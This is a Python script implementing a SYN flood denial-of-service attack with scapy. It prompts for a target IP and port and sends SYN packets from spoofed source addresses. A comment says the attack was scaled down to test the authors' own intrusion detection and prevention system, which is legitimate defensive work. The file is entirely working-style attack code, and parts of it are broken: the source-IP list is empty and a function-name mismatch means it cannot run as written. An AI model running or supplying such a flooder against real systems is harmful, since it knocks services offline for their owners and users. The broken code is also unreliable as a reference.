#!/user/bin/python3
#SYN Flood attack based on code from EmreOvunc: https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py

from scapy.all import *
import os
import sys
import random

def randInt():
    x = randint(1000,9000)
    return x

def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    ip_list = []
    print ("Sending Packets...")
  
    for x in range (0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP ()
        #The original attack sends SYN packets from random IP Addresses
        #To make it easier for our IDPS to mitigate the attack
        #We limited the scope of the attack to 7 different IPs
        IP_Packet.src = ip_list[random.randint(0,6)]
        IP_Packet.dst = dstIP

        TCP_Packet = TCP ()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=0)
        total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def into():
    os.system("clear")
    print ("SYN Flood Attack")

    dstIP = input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")

    return dstIP, int(dstPort)

def main():
    dstIP, dstPort = info()
    counter = input ("How many packets to send : ")
    SYN_Flood(dstIP,dstPort,int(counter))

main()
